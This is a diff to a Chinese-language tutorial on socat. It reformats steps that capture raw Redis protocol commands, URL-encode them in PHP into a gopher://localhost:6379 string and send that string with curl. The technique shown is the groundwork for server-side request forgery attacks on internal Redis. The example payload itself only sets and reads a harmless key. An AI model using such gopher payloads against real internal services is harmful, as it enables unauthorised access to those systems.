@@ -22,6 +22,7 @@ socat是一个多功能的网络工具，名字来由是“Socket CAT”，可�
 
 * 在之前的socat命令运行中获得输入:
 
+`
     *3\r
     $3\r
     set\r
@@ -34,9 +35,10 @@ socat是一个多功能的网络工具，名字来由是“Socket CAT”，可�
     get\r
     $1\r
     a\r
+`
 
-* 运用任何一种熟悉的语言，对输入进行urlencode:
-
+* 运用任何一种熟悉的语言,比如php，对输入进行urlencode:
+`
     $message = "*3\r
     $3\r
     set\r
@@ -53,13 +55,15 @@ socat是一个多功能的网络工具，名字来由是“Socket CAT”，可�
     
     $gopherstr = "gopher://localhost:6379/_" . urlencode($message) ;
     echo $gopherstr;
+`
 * 运用curl组合gopher串进行测试:
 
-    `curl -s <$gopherstr>`
+`$ curl -s <$gopherstr>`
 
     获取到输出该网络流的输出:
 
-    +OK
-    $11
-    hihackworld
-
+`
++OK
+$11
+hihackworld
+`
